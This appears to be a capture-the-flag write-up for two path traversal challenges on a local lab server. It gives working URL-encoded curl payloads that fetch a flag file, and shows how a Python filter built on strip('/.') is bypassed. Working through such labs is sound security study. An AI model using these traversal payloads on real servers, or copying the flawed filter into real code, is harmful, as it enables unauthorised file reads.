#### path traversal 1:

`curl -v "http://challenge.localhost:80/package/%2e%2e%2f%2e%2e%2f%66%6c%61%67"`
* routes that start with `/package/` are responded
* `../` are filtered.

#### path traversal 2:

if we go with the previous solution:

```
DEBUG: requested_path='/challenge/files/flag'
127.0.0.1 - - [09/Mar/2025 02:23:58] "GET /content/..%2f..%2fflag HTTP/1.1" 404 -
```

it uses `strip()` to remove path traversal stuff:

`requested_path = app.root_path + "/files/" + path.strip("/.")`

notice these:

```python
>>> "/../../../flag".strip("/.")
'flag'
>>> "fortunes/../../../flag".strip("/.")
'fortunes/../../../flag'
```

`strip()` only remove leading or trailing characters not the pattern.

solution:

`curl -v "http://challenge.localhost:80/content/fortunes%2f..%2f..%2f..%2fflag"`

or just encode the whole thing: `/content/fortunes%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67`

both are translated into this:

```
DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
127.0.0.1 - - [09/Mar/2025 02:20:07] "GET /content/fortunes%2f..%2f..%2f..%2fflag HTTP/1.1" 200 -
```